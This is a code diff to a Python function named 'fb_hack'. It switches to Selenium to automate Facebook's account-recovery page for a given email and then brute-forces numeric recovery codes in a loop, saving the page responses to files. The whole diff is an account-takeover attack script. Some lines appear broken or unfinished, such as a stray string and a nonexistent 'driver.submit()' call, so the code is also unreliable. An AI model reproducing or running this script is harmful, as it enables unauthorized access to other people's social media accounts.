@@ -31,33 +31,30 @@ def fb_hack(email, codex, respect):
   os.system('clear')
   soup = BeautifulSoup()
   driver = webdriver.Chrome()
-  browser = mechanize.Browser()
-  browser.set_handle_robots(False)
-  cookies = mechanize.CookieJar()
-  browser.set_cookiejar(cookies)
-  browser.addheaders = [('User-agent', MOZILLA_UAS)]
-  browser.set_handle_refresh(False)
   driver.get('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
-  browser.select_form(nr=0)
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  mobile = soup.find(string=re.compile("mobile"))
-  browser.click(coord=(428,18))
-  browser.form['email'] = email
-  browser.submit()
+  html = driver.page_source
+  soup = BeautifulSoup(html, 'html.parser')
+  search_box = driver.find_element_by_name("email")
+  search_box.send_keys(email)
+  search_box.submit()
+  search_button = driver.find_element_by_name("tryanotherway")
+  search_button.click()
+  driver.submit()
+  "make respect properly"
   counter = 0
-  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
+  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
     counter += 1
     if counter <= codex:
       print("working", end='\r')
     else:
       try:
-        browser.form['pass'] = p
-        browser.submit()
+        searchbox = driver.find_element_by_name("n")
+        searchbox.send_keys(p)
+        searchbox.submit()
       except:
-        response1 = browser.response()
-        soup = BeautifulSoup(response1, 'html.parser')
+        html = driver.page_source
+        soup = BeautifulSoup(html, 'html.parser')
         with open("output1.html", "w") as file:
           file.write(str(soup))
         with open("output1.txt", "w") as file:
@@ -78,11 +75,6 @@ def fb_hack(email, codex, respect):
         respect = 0
         break
       sleepy(30)
-    
-  browser.select_form(nr=0)
-  forms = list(browser.forms())
-  form = forms[0]
-  print(form)
   past = int(respect)
   return past
 
